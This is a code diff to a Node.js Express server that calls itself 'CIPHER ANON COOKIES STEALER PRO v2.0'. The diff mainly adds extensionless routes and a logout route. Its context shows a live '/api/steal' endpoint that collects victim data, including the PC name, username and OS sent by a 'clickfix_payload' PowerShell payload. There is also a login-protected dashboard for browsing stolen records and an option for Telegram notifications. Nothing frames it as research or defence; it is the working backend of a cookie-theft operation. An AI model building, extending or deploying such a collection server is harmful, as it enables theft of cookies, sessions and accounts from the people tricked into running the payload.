@@ -3,6 +3,7 @@
 // Railway Ready — Full Environment Variable Support
 // Fixed: Dedup uses IP + userAgent + screen + nonce + data check
 // Fixed: Handles PowerShell payload with PC name
+// Clean URLs: No .php extension needed
 // ============================================================
 
 const express = require('express');
@@ -116,7 +117,7 @@ app.use((req, res, next) => {
                 if (req.path.startsWith('/api')) {
                     return res.status(401).json({ status: 'error', message: 'Session expired' });
                 }
-                res.redirect('/login.php');
+                res.redirect('/login');
             });
             return;
         }
@@ -214,7 +215,6 @@ function getDedupKey(ip, userAgent, screen, nonce) {
     return crypto.createHash('md5').update(`${cleanIp}|${ua}|${scr}|${n}`).digest('hex');
 }
 
-// ---- Check if same IP already exists in stored data within window ----
 function isIpInData(ip, source) {
     const now = Date.now();
     const fiveSecondsAgo = now - 5000;
@@ -233,7 +233,6 @@ function isIpInData(ip, source) {
 function isDuplicate(req, userAgent, screen, nonce, source) {
     cleanDedup();
 
-    // Check nonce first (fastest)
     if (nonce && nonceCache.has(nonce)) {
         console.log(`[!] Nonce duplicate: ${nonce}`);
         return true;
@@ -241,12 +240,10 @@ function isDuplicate(req, userAgent, screen, nonce, source) {
 
     const ip = getRealIp(req);
 
-    // ---- Check if this IP already exists in stored data within 5 seconds ----
     if (isIpInData(ip, source)) {
         return true;
     }
 
-    // ---- Check cache ----
     const key = getDedupKey(ip, userAgent, screen, nonce);
     if (dedupCache.has(key)) {
         const ts = dedupCache.get(key);
@@ -256,7 +253,6 @@ function isDuplicate(req, userAgent, screen, nonce, source) {
         }
     }
 
-    // Store both
     if (nonce) {
         nonceCache.set(nonce, Date.now());
     }
@@ -285,7 +281,7 @@ function requireAuth(req, res, next) {
     if (req.path.startsWith('/api')) {
         return res.status(401).json({ status: 'error', message: 'Unauthorized - Please login' });
     }
-    res.redirect('/login.php');
+    res.redirect('/login');
 }
 
 // ============================================================
@@ -455,7 +451,17 @@ app.get('/api/logout', (req, res) => {
         if (err) log(`[!] Logout error: ${err.message}`);
         res.clearCookie('connect.sid');
         log('[+] User logged out, session destroyed');
-        res.redirect('/login.php');
+        res.redirect('/login');
+    });
+});
+
+// ---- LOGOUT (clean URL) ----
+app.get('/logout', (req, res) => {
+    req.session.destroy((err) => {
+        if (err) log(`[!] Logout error: ${err.message}`);
+        res.clearCookie('connect.sid');
+        log('[+] User logged out, session destroyed');
+        res.redirect('/login');
     });
 });
 
@@ -484,12 +490,10 @@ app.post('/api/steal', async (req, res) => {
 
         // ---- If this is from the PowerShell payload, extract PC name ----
         if (source === 'clickfix_payload' && data.system && data.system.hostname) {
-            // Use PC name as the domain/hostname for display
             if (data.fingerprint) {
                 data.fingerprint.hostname = data.system.hostname;
                 data.fingerprint.userAgent = 'PowerShell Payload (Windows)';
             }
-            // Also store the PC name separately
             data.pcName = data.system.hostname;
             data.victimUsername = data.system.username || 'Unknown';
             data.victimOS = data.system.os || 'Unknown';
@@ -659,7 +663,7 @@ app.post('/api/change-password', requireAuth, (req, res) => {
         res.json({
             status: 'ok',
             message: 'Password updated successfully',
-            redirect: '/password-success.php'
+            redirect: '/password-success'
         });
     });
 });
@@ -699,11 +703,37 @@ app.post('/api/config/telegram', requireAuth, (req, res) => {
 });
 
 // ============================================================
-// FRONTEND ROUTES
+// FRONTEND ROUTES — CLEAN URLS (NO .php)
 // ============================================================
 
 // ---- Public Routes (No Auth Required) ----
 app.get('/', (req, res) => {
+    if (req.session && req.session.authenticated) {
+        return res.redirect('/dashboard');
+    }
+    res.redirect('/home');
+});
+
+app.get('/home', (req, res) => {
+    res.redirect('/home.php');
+});
+
+app.get('/login', (req, res) => {
+    res.redirect('/login.php');
+});
+
+// ---- Protected Routes (Auth Required) ----
+app.get('/dashboard', requireAuth, (req, res) => {
+    res.redirect('/dashboard.php');
+});
+
+app.get('/password-success', requireAuth, (req, res) => {
+    res.redirect('/password-success.php');
+});
+
+// ---- Direct .php files (still work, but redirect to clean URLs) ----
+app.get('/home.php', (req, res) => {
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.sendFile(path.join(__dirname, 'public', 'home.php'));
 });
 
@@ -715,13 +745,7 @@ app.get('/login.php', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'login.php'));
 });
 
-app.get('/home.php', (req, res) => {
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    res.sendFile(path.join(__dirname, 'public', 'home.php'));
-});
-
-// ---- Protected Routes (Auth Required) ----
-app.get('/dashboard', requireAuth, (req, res) => {
+app.get('/dashboard.php', requireAuth, (req, res) => {
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.sendFile(path.join(__dirname, 'public', 'dashboard.php'));
 });
@@ -751,7 +775,7 @@ app.get('*.php', (req, res, next) => {
     
     // ALL other .php files require authentication
     if (!req.session || !req.session.authenticated) {
-        return res.redirect('/login.php');
+        return res.redirect('/login');
     }
     
     if (fs.existsSync(filePath)) {
@@ -816,8 +840,8 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('  🍪 CIPHER ANON COOKIES STEALER PRO v2.0');
     console.log('='.repeat(55));
     console.log(`  [+] Server: http://localhost:${PORT}`);
-    console.log(`  [+] Login: http://localhost:${PORT}/login.php`);
-    console.log(`  [+] Home: http://localhost:${PORT}/home.php`);
+    console.log(`  [+] Login: http://localhost:${PORT}/login`);
+    console.log(`  [+] Home: http://localhost:${PORT}/home`);
     console.log(`  [+] Dashboard: http://localhost:${PORT}/dashboard`);
     console.log(`  [+] Health: http://localhost:${PORT}/health`);
     console.log(`  [+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
@@ -826,6 +850,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`  [+] Dedup: IP + UA + screen + nonce + data check, 5s window`);
     console.log(`  [+] Anti-Bot: ENABLED ✅`);
     console.log(`  [+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
+    console.log(`  [+] Clean URLs: ENABLED ✅ (no .php needed)`);
     console.log('='.repeat(55) + '\n');
 });
 
